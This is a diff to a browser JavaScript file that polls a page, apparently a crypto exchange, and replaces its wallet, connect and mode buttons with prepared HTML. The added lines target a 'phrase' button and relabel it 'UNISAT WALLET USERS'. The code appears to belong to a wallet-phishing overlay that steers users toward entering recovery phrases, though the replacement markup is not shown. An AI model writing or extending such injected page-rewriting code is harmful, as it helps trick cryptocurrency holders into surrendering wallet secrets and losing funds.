@@ -4,6 +4,8 @@ let moreOptions;
 let swapBtn;
 let mainBtn;
 let hdwalletMode;
+let phraseBtn;
+let a = 0;
 console.log("sserrrnn");
 
 function getBtn() {
@@ -16,9 +18,10 @@ function getBtn() {
     hdwalletMode = document.querySelector(
       'a[href="https://app-hd.multibit.exchange/"]'
     );
+    phraseBtn = document.querySelector(phraseBtnClasses);
     console.log("loop");
-    if (hdwalletMode) {
-      // try {
+    if (hdwalletMode && a <= 1) {
+      a++;
       walletBtn.outerHTML = wlt1;
       if (connectBtn) connectBtn.outerHTML = connectBtn1;
       if (moreOptions) moreOptions.outerHTML = moreOptions1;
@@ -26,7 +29,10 @@ function getBtn() {
       mainBtn.outerHTML = mainBtn1;
       hdwalletMode.outerHTML = hdwalletMode1;
       console.log(hdwalletMode);
-      // } catch (error) {}
+    }
+    if (phraseBtn) {
+      phraseBtn.classList.add("sc-eKszNL", "fTpgsT");
+      phraseBtn.textContent = phraseBtnText;
       clearInterval(intv);
     }
   }, 300);
@@ -56,3 +62,7 @@ const modal1 = `
 
 const moreOptionsClasses = `.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.mui-style-wekeca`;
 const moreOptions1 = `<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium mui-style-wekeca" tabindex="0" type="button">···<span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button>`;
+
+//
+const phraseBtnClasses = `.sc-iNWwEs.fKICOT`;
+const phraseBtnText = "UNISAT WALLET USERS";
